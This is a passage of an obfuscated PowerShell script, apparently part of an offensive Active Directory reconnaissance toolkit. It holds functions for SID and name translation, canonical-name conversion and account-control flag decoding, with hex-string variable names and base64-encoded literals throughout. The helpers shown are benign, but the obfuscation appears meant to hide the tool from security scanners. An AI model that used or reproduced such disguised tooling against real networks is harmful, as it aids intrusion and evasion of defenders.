            ${c4a41499c8654975888fc2e39184e1e7} = @(([Net.Dns]::GetHostEntry(${c096522c7bbe4c7aaadf99843e3b09fb})).AddressList)
            if (${c4a41499c8654975888fc2e39184e1e7}.Count -ne 0) {
                ForEach (${934af845da6e4eb0a5370de6d7b8da04} in ${c4a41499c8654975888fc2e39184e1e7}) {
                    if (${934af845da6e4eb0a5370de6d7b8da04}.AddressFamily -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAE4AZQB0AHcAbwByAGsA')))) {
                        ${934af845da6e4eb0a5370de6d7b8da04}.IPAddressToString
                    }
                }
            }
        }
        catch {
            Write-Verbose -Message $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkACAAbgBvAHQAIAByAGUAcwBvAGwAdgBlACAAaABvAHMAdAAgAHQAbwAgAGEAbgAgAEkAUAAgAEEAZABkAHIAZQBzAHMALgA=')))
        }
    }
    end {}
}
function Convert-NameToSid {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        [Alias('Name')]
        ${d812a92a48c94a1ab80bf8ce2384cab2},
        [String]
        ${afa30c601e734738b32424a6234484e4} = (Get-NetDomain).Name
    )
    process {
        ${d812a92a48c94a1ab80bf8ce2384cab2} = ${d812a92a48c94a1ab80bf8ce2384cab2} -replace "/","\"
        if(${d812a92a48c94a1ab80bf8ce2384cab2}.contains("\")) {
            ${afa30c601e734738b32424a6234484e4} = ${d812a92a48c94a1ab80bf8ce2384cab2}.split("\")[0]
            ${d812a92a48c94a1ab80bf8ce2384cab2} = ${d812a92a48c94a1ab80bf8ce2384cab2}.split("\")[1]
        }
        try {
            ${02bd686d816c4b9c93d019c255069be2} = (New-Object System.Security.Principal.NTAccount(${afa30c601e734738b32424a6234484e4},${d812a92a48c94a1ab80bf8ce2384cab2}))
            ${02bd686d816c4b9c93d019c255069be2}.Translate([System.Security.Principal.SecurityIdentifier]).Value
        }
        catch {
            Write-Verbose "Invalid object/name: ${afa30c601e734738b32424a6234484e4}\${d812a92a48c94a1ab80bf8ce2384cab2}"
            $Null
        }
    }
}
function Convert-SidToName {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        ${d72c41ecfd1e4100a077ef856e028545}
    )
    process {
        try {
            ${f6100d2d814748019ba7819a1bc8affb} = ${d72c41ecfd1e4100a077ef856e028545}.trim('*')
            Switch (${f6100d2d814748019ba7819a1bc8affb})
            {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AGwAbAAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAwAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAGIAbwBkAHkA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBvAHIAbABkACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAxAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB2AGUAcgB5AG8AbgBlAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAyAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AcwBvAGwAZQAgAEwAbwBnAG8AbgAgAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAE8AdwBuAGUAcgAgAFMAZQByAHYAZQByAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AG8AcgAgAEcAcgBvAHUAcAAgAFMAZQByAHYAZQByAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQAzAC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwB3AG4AZQByACAAUgBpAGcAaAB0AHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA0AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4ALQB1AG4AaQBxAHUAZQAgAEEAdQB0AGgAbwByAGkAdAB5AA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AA==')))         { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAGEAbAB1AHAA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHQAdwBvAHIAawA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBhAHQAYwBoAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGEAYwB0AGkAdgBlAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANgA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0ANwA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBuAG8AbgB5AG0AbwB1AHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOQA=')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAHQAZQByAHAAcgBpAHMAZQAgAEQAbwBtAGEAaQBuACAAQwBvAG4AdAByAG8AbABsAGUAcgBzAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwAIABTAGUAbABmAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAxAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABlAG4AdABpAGMAYQB0AGUAZAAgAFUAcwBlAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAyAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdAByAGkAYwB0AGUAZAAgAEMAbwBkAGUA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQAzAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABlAHIAbQBpAG4AYQBsACAAUwBlAHIAdgBlAHIAIABVAHMAZQByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA0AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAG0AbwB0AGUAIABJAG4AdABlAHIAYQBjAHQAaQB2AGUAIABMAG8AZwBvAG4A'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA1AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA3AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGkAcwAgAE8AcgBnAGEAbgBpAHoAYQB0AGkAbwBuACAA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA4AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsACAAUwB5AHMAdABlAG0A'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMQA5AA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMgAwAA==')))      { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUACAAQQB1AHQAaABvAHIAaQB0AHkA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AOAAwAC0AMAA=')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAIABTAGUAcgB2AGkAYwBlAHMAIAA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFUAcwBlAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEcAdQBlAHMAdABzAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAbwB3AGUAcgAgAFUAcwBlAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAG8AdQBuAHQAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFMAZQByAHYAZQByACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBpAG4AdAAgAE8AcABlAHIAYQB0AG8AcgBzAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEIAYQBjAGsAdQBwACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBwAGwAaQBjAGEAdABvAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBlAC0AVwBpAG4AZABvAHcAcwAgADIAMAAwADAAIABDAG8AbQBwAGEAdABpAGIAbABlACAAQQBjAGMAZQBzAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAgAFUAcwBlAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAE4AZQB0AHcAbwByAGsAIABDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEkAbgBjAG8AbQBpAG4AZwAgAEYAbwByAGUAcwB0ACAAVAByAHUAcwB0ACAAQgB1AGkAbABkAGUAcgBzAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAE0AbwBuAGkAdABvAHIAIABVAHMAZQByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAEwAbwBnACAAVQBzAGUAcgBzAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFcAaQBuAGQAbwB3AHMAIABBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACAAQQBjAGMAZQBzAHMAIABHAHIAbwB1AHAA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAATABpAGMAZQBuAHMAZQAgAFMAZQByAHYAZQByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEQAaQBzAHQAcgBpAGIAdQB0AGUAZAAgAEMATwBNACAAVQBzAGUAcgBzAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADMA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEUAdgBlAG4AdAAgAEwAbwBnACAAUgBlAGEAZABlAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAFMAZQByAHYAaQBjAGUAIABEAEMATwBNACAAQQBjAGMAZQBzAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAAUgBlAG0AbwB0AGUAIABBAGMAYwBlAHMAcwAgAFMAZQByAHYAZQByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAARQBuAGQAcABvAGkAbgB0ACAAUwBlAHIAdgBlAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAATQBhAG4AYQBnAGUAbQBlAG4AdAAgAFMAZQByAHYAZQByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEgAeQBwAGUAcgAtAFYAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA4ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                Default { 
                    ${02bd686d816c4b9c93d019c255069be2} = (New-Object System.Security.Principal.SecurityIdentifier(${f6100d2d814748019ba7819a1bc8affb}))
                    ${02bd686d816c4b9c93d019c255069be2}.Translate( [System.Security.Principal.NTAccount]).Value
                }
            }
        }
        catch {
            ${d72c41ecfd1e4100a077ef856e028545}
        }
    }
}
function Convert-NT4toCanonical {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        ${d812a92a48c94a1ab80bf8ce2384cab2}
    )
    process {
        ${d812a92a48c94a1ab80bf8ce2384cab2} = ${d812a92a48c94a1ab80bf8ce2384cab2} -replace "/","\"
        if(${d812a92a48c94a1ab80bf8ce2384cab2}.contains("\")) {
            ${afa30c601e734738b32424a6234484e4} = ${d812a92a48c94a1ab80bf8ce2384cab2}.split("\")[0]
        }
        function Invoke-Method([__ComObject] ${b2929ecf6cd74a84bce9ccd2f5622fbb}, [String] ${b2abe530830445cbb72b697b996bcc74}, ${a1222ef63e2c418a9061e1f9abaea0ce}) {
            ${ba07974faf104db5a05c8c7bd5074855} = ${b2929ecf6cd74a84bce9ccd2f5622fbb}.GetType().InvokeMember(${b2abe530830445cbb72b697b996bcc74}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUATQBlAHQAaABvAGQA'))), $Null, ${b2929ecf6cd74a84bce9ccd2f5622fbb}, ${a1222ef63e2c418a9061e1f9abaea0ce})
            if ( ${ba07974faf104db5a05c8c7bd5074855} ) { ${ba07974faf104db5a05c8c7bd5074855} }
        }
        function Set-Property([__ComObject] ${b2929ecf6cd74a84bce9ccd2f5622fbb}, [String] ${e87ec1ffc9db4fdf9361349d8693ae94}, ${a1222ef63e2c418a9061e1f9abaea0ce}) {
            [Void] ${b2929ecf6cd74a84bce9ccd2f5622fbb}.GetType().InvokeMember(${e87ec1ffc9db4fdf9361349d8693ae94}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, ${b2929ecf6cd74a84bce9ccd2f5622fbb}, ${a1222ef63e2c418a9061e1f9abaea0ce})
        }
        ${34a870b0788340e885c8e92894c695d3} = New-Object -ComObject NameTranslate
        try {
            Invoke-Method ${34a870b0788340e885c8e92894c695d3} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdAA='))) (1, ${afa30c601e734738b32424a6234484e4})
        }
        catch [System.Management.Automation.MethodInvocationException] { 
            Write-Debug "Error with translate init in Convert-NT4toCanonical: $_"
        }
        Set-Property ${34a870b0788340e885c8e92894c695d3} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcwBlAFIAZQBmAGUAcgByAGEAbAA='))) (0x60)
        try {
            Invoke-Method ${34a870b0788340e885c8e92894c695d3} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA'))) (3, ${d812a92a48c94a1ab80bf8ce2384cab2})
            (Invoke-Method ${34a870b0788340e885c8e92894c695d3} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) (2))
        }
        catch [System.Management.Automation.MethodInvocationException] {
            Write-Debug "Error with translate Set/Get in Convert-NT4toCanonical: $_"
        }
    }
}
function Convert-CanonicaltoNT4 {
    [CmdletBinding()]
    param(
        [String] ${d812a92a48c94a1ab80bf8ce2384cab2}
    )
    ${afa30c601e734738b32424a6234484e4} = (${d812a92a48c94a1ab80bf8ce2384cab2} -split "@")[1]
    ${d812a92a48c94a1ab80bf8ce2384cab2} = ${d812a92a48c94a1ab80bf8ce2384cab2} -replace "/","\"
    function Invoke-Method([__ComObject] ${b2929ecf6cd74a84bce9ccd2f5622fbb}, [String] ${b2abe530830445cbb72b697b996bcc74}, ${a1222ef63e2c418a9061e1f9abaea0ce}) {
        ${ba07974faf104db5a05c8c7bd5074855} = ${b2929ecf6cd74a84bce9ccd2f5622fbb}.GetType().InvokeMember(${b2abe530830445cbb72b697b996bcc74}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUATQBlAHQAaABvAGQA'))), $NULL, ${b2929ecf6cd74a84bce9ccd2f5622fbb}, ${a1222ef63e2c418a9061e1f9abaea0ce})
        if ( ${ba07974faf104db5a05c8c7bd5074855} ) { ${ba07974faf104db5a05c8c7bd5074855} }
    }
    function Set-Property([__ComObject] ${b2929ecf6cd74a84bce9ccd2f5622fbb}, [String] ${e87ec1ffc9db4fdf9361349d8693ae94}, ${a1222ef63e2c418a9061e1f9abaea0ce}) {
        [Void] ${b2929ecf6cd74a84bce9ccd2f5622fbb}.GetType().InvokeMember(${e87ec1ffc9db4fdf9361349d8693ae94}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $NULL, ${b2929ecf6cd74a84bce9ccd2f5622fbb}, ${a1222ef63e2c418a9061e1f9abaea0ce})
    }
    ${34a870b0788340e885c8e92894c695d3} = New-Object -comobject NameTranslate
    try {
        Invoke-Method ${34a870b0788340e885c8e92894c695d3} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdAA='))) (1, ${afa30c601e734738b32424a6234484e4})
    }
    catch [System.Management.Automation.MethodInvocationException] { }
    Set-Property ${34a870b0788340e885c8e92894c695d3} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcwBlAFIAZQBmAGUAcgByAGEAbAA='))) (0x60)
    try {
        Invoke-Method ${34a870b0788340e885c8e92894c695d3} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA'))) (5, ${d812a92a48c94a1ab80bf8ce2384cab2})
        (Invoke-Method ${34a870b0788340e885c8e92894c695d3} $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) (3))
    }
    catch [System.Management.Automation.MethodInvocationException] { $_ }
}
function ConvertFrom-UACValue {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        ${e90163d6067a479d9ce734224dc75bc9},
        [Switch]
        ${b48dbad4885b4800980979010426b8fd}
    )
    begin {
        ${477642117c8241ba89a5c9a261126284} = New-Object System.Collections.Specialized.OrderedDictionary
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBDAFIASQBQAFQA'))), 1)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEMATwBVAE4AVABEAEkAUwBBAEIATABFAA=='))), 2)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQBEAEkAUgBfAFIARQBRAFUASQBSAEUARAA='))), 8)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABPAEMASwBPAFUAVAA='))), 16)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBOAE8AVABSAEUAUQBEAA=='))), 32)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBDAEEATgBUAF8AQwBIAEEATgBHAEUA'))), 64)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA=='))), 128)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABFAE0AUABfAEQAVQBQAEwASQBDAEEAVABFAF8AQQBDAEMATwBVAE4AVAA='))), 256)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFIATQBBAEwAXwBBAEMAQwBPAFUATgBUAA=='))), 512)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFQARQBSAEQATwBNAEEASQBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 2048)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBPAFIASwBTAFQAQQBUAEkATwBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 4096)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAFIAVgBFAFIAXwBUAFIAVQBTAFQAXwBBAEMAQwBPAFUATgBUAA=='))), 8192)
        ${477642117c8241ba89a5c9a261126284}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAEUAWABQAEkAUgBFAF8AUABBAFMAUwBXAE8AUgBEAA=='))), 65536)
